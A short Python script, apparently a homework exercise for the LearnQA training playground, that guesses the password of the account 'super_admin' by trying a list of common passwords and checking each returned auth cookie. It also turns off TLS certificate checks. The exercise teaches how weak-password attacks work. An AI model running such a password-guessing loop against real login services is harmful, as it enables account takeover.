import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

login = "super_admin"
url_get_cookie = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
url_check_cookie = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"
passwords = ["123456", "admin", "12345678", "123456789","12345","password","Aa123456","1234567890","Pass@123","admin123","1234567","123123","111111","12345678910","P@ssw0rd","Password","Aa@123456","admintelecom","Admin@123","112233","qwerty","iloveyou","abc123","qwerty123","1q2w3e4r","qwertyuiop","654321","555555","lovely","7777777","welcome","888888","princess","dragon","password1","123qwe"]

for password in passwords:
    print(password)
    response1 = requests.post(url_get_cookie, data={"login": login, "password": password}, verify=False)
    cookie_value = response1.cookies["auth_cookie"]

    response2 = requests.get(url_check_cookie, cookies={"auth_cookie": cookie_value}, verify=False)
    print(response2.text)

    if response2.text != "You are NOT authorized":
        print("Пароль найден:", password)
        print("Ответ:", response2.text)
        break